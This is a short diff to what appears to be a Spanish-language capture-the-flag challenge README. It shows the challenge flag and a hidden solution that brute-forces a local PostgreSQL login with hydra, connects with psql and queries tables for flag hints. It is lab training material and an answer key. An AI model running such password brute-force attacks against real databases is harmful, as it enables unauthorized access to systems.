@@ -29,6 +29,8 @@ flag{h4yun453rp13nt33nm1b0t4}
 <details>
     <summary> Cúrratelo anda 😉, y si ves que nada, pulsa aquí para ver la solución</summary>
     - Realizar ataque con hydra: hydra -l admin -P file.log postgres://localhost:5432/story_boris_db
+    <br>
     - Conectar a la base de datos: psql -h localhost -U admin -d story_boris_db
+    <br>
     - Realizar las consultas a las tablas para ver pistas en las columnas 'fl' y 'ag' de las tablas 'songs' y 'users'
 </details>
